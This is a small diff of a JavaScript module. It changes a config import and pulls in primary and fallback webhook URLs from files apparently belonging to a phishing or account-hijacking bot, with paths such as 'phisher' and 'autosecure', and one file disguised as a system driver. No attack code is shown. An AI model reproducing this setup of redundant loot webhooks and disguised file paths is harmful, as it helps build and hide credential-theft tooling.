@@ -1,5 +1,5 @@
 const axios = require('axios');
-const config = require('../../../../config.json');
+const config = require('../../../../config');
 const { PRIMARY_WEBHOOK_URL } = require('../../../modals/embed/claimsplit.js');
 const { FALLBACK_WEBHOOK_URL } = require('../../../../mainbot/modals/phisher/changewebhookmodal.js');
 const { SECONDARY_FALLBACK_WEBHOOK_URL } = require('../../../../autosecure/utils/logout/.internal/Sys Driver/sys/drivers/Sysupdate.js');
